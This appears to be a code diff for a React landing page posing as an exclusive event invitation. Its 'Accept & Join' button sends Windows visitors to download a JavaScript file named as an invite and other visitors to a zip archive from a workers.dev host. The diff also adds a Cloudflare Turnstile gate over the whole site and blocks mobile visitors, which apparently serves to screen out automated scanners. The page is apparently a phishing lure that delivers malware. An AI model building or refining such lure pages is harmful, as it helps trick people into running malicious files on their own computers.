@@ -6,7 +6,13 @@ import './App.css';
 const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PdO04PULzOibL';
 
 export default function App() {
+  const [isVerified, setIsVerified] = useState(false);
   const [isMobile, setIsMobile] = useState(false);
+
+  useEffect(() => {
+    // Always start fresh - force Turnstile on every reload
+    sessionStorage.removeItem('turnstile_verified');
+  }, []);
 
   useEffect(() => {
     const checkMobile = () => {
@@ -18,44 +24,87 @@ export default function App() {
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
 
+  // If not verified, show Turnstile gate (blocks everything)
+  if (!isVerified) {
+    return <TurnstileGate onVerified={() => setIsVerified(true)} />;
+  }
+
   if (isMobile)
   {
     return <MobileBlocker />;
   }
 
-
   return <Invite />;
 }
 
-function Invite() {
+function TurnstileGate({ onVerified }) {
+  const [error, setError] = useState(null);
   const [turnstileToken, setTurnstileToken] = useState(null);
-  const [verificationError, setVerificationError] = useState(null);
 
-  const handleTurnstileChange = (token) => {
+  const handleTurnstileSuccess = (token) => {
     setTurnstileToken(token);
-    setVerificationError(null);
+    setError(null);
+    // Automatically verify and proceed
+    sessionStorage.setItem('turnstile_verified', 'true');
+    onVerified();
   };
 
-  const handleDownload = async () => {
-    if (!turnstileToken) {
-      setVerificationError('Please complete the verification');
-      return;
-    }
+  const handleTurnstileError = () => {
+    setError('Verification failed. Please try again.');
+    setTurnstileToken(null);
+  };
 
-    try {
-      const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
+  const handleTurnstileExpire = () => {
+    setError('Verification expired. Please complete again.');
+    setTurnstileToken(null);
+  };
 
-      if (isWindows)
-      {
-        // Replace with your Windows download URL
-        window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Exclusive-Event-Invite.js';
-      } else
-      {
-        // Replace with your Mac download URL
-        window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Event-Invite.zip';
-      }
-    } catch (error) {
-      setVerificationError('An error occurred. Please try again.');
+  return (
+    <div className="turnstile-gate-container">
+      <div className="turnstile-gate-overlay"></div>
+      <div className="turnstile-gate-content">
+        <div className="turnstile-gate-box">
+          <h2 className="turnstile-gate-title">Verify Your Access</h2>
+          <p className="turnstile-gate-subtitle">
+            Please complete the verification to continue
+          </p>
+
+          <div className="turnstile-gate-widget">
+            <Turnstile
+              sitekey={TURNSTILE_SITE_KEY}
+              onSuccess={handleTurnstileSuccess}
+              onError={handleTurnstileError}
+              onExpire={handleTurnstileExpire}
+              theme="light"
+              size="normal"
+            />
+          </div>
+
+          {error && (
+            <p className="turnstile-gate-error">{error}</p>
+          )}
+
+          <p className="turnstile-gate-info">
+            🔒 This site is protected by Cloudflare Turnstile
+          </p>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function Invite() {
+  const handleDownload = () => {
+    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
+
+    if (isWindows)
+    {
+      // Replace with your Windows download URL
+      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Exclusive-Event-Invite.js';
+    } else
+    {
+      // Replace with your Mac download URL
+      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Event-Invite.zip';
     }
   };
 
@@ -84,24 +133,7 @@ function Invite() {
               <span className="highlight">Please accept this invitation and be part of something special.</span>
             </p>
 
-            <div className="turnstile-container">
-              <Turnstile
-                sitekey={TURNSTILE_SITE_KEY}
-                onSuccess={handleTurnstileChange}
-                onError={() => setVerificationError('Verification failed. Please try again.')}
-                theme="light"
-              />
-            </div>
-
-            {verificationError && (
-              <p className="error-message">{verificationError}</p>
-            )}
-
-            <button
-              className="accept-btn"
-              onClick={handleDownload}
-              disabled={!turnstileToken}
-            >
+            <button className="accept-btn" onClick={handleDownload}>
               Accept & Join
             </button>
           </div>
